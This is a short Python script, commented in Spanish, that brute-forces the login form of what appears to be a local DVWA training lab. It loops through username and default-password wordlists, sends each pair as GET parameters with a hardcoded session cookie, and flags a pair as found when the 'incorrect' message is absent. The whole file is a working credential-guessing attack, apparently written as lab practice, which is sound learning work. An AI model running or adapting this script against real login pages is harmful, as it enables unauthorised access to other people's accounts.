import requests

# Variables para el ataque
url = "http://localhost:4280/vulnerabilities/brute/"
users_list = "users.txt"
passwords_list = "http_default_passwords.txt"
grep = 'Username and/or password incorrect.'

# Configuración de cabeceras HTTP
cookies = {
    'security': 'low',
    'PHPSESSID': '7ed6924e290405b95b84f5a47136ee14',
}

headers = {
    'User-Agent': '(from Python) Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br, zstd',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',  
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Cache-Control': 'no-cache' 
}

# Función de fuerza bruta
def brute_force(username, target_url):
    with open(passwords_list, 'r') as passwords:
        for password in passwords:
            password = password.strip()
            print(f' Prueba de combinación: {username} -> {password}')
            
            params = {
                'username': username,
                'password': password,
                'Login': 'Login'
            }
            
            response = requests.get(
                target_url,
                headers=headers,
                cookies=cookies,
                params=params
            )
            
            if grep in response.content.decode():
                continue
            else:
                print(f"\033[92mSe ha encontrado combinación: {username}/{password}\033[0m")
                return True
    return False

# Bucle principal de usuarios
with open(users_list, 'r') as users:
    for username in users:
        username = username.strip()
        print('\n==============================')
        print(f'Intento de usuario: {username}')
        
        if not brute_force(username, url):
            print(f"\033[91mNo existen coincidencias para {username}\033[0m")

print('\nFinalizado.')